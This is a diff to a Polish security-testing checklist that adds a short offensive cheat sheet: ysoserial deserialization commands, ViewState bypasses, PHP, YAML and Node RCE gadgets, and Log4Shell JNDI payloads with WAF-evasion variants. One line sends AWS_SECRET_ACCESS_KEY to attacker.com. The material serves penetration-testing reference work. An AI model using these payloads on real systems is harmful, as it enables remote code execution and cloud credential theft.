@@ -136,3 +136,26 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.3.3 | Sanitization | Verify that data being passed to a potentially dangerous context is sanitized beforehand to enforce safety measures, such as only allowing characters which are safe for this context and trimming input which is too long. |
+
+
+---
+
+## HackTricks Tips
+
+### Deserialization → Code Execution
+
+- **Java**: `ysoserial-plus.jar` (130+ chains): `java -jar ysoserial-plus.jar CommonsCollections6 'calc' | base64`
+- **.NET ViewState** (bez MAC): `ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter`
+- **ViewState encryption bypass (pre-.NET 4.5)**: usuń parametr `__VIEWSTATEENCRYPTED` → serwer akceptuje niezaszyfrowany
+- **ViewState key bruteforce**: `badsecrets` / `Blacklist3r` przeciwko known leaked keys
+- **PHP**: brak gadgetów w app? Załaduj autoloader innej app: `www_frontend_vendor_autoload` → `/www/frontend/vendor/autoload.php`
+- **`phar://` trigger**: dowolna `file_exists()` na `phar://` URL deserializuje metadata (PHP < 8.0)
+- **Python YAML**: `!!python/object/apply:subprocess.Popen\n- ls` (vulnerable: `UnsafeLoader`, `Loader` pre-5.1)
+- **Node.js Prototype Pollution → RCE**: via Handlebars (`Object.prototype.type="Program"`), Pug (`__proto__.block`), EJS
+
+### Log4Shell (CVE-2021-44228)
+
+- **Detection**: `${jndi:ldap://x${hostName}.L4J.<collaborator>/a}`
+- **v2.15 bypass**: `${jndi:ldap://127.0.0.1#attacker.com/...}`
+- **WAF bypass**: `${${lower:j}ndi:${lower:l}dap://...}`, `${${::-j}${::-n}${::-d}${::-i}:...}`
+- **Env var exfil**: `${jndi:ldap://jv-${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}`
